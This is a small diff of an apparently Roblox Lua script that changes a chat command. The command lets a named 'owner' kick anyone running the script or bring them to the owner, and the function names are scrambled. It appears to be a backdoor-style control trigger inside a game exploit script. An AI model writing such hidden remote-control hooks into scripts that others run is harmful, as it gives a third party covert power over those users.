@@ -48,7 +48,7 @@ function a1b2c3(ownerName)
 
     if owner then
         owner.Chatted:Connect(function(message)
-            if message == "/kick vrlockers" then
+            if message == "/kick .vrlockers" then
                 localPlayer:Kick("Vrlock Owner Has Kicked You.")
             elseif message == "/bring ." then
                 x1y2z3(owner)
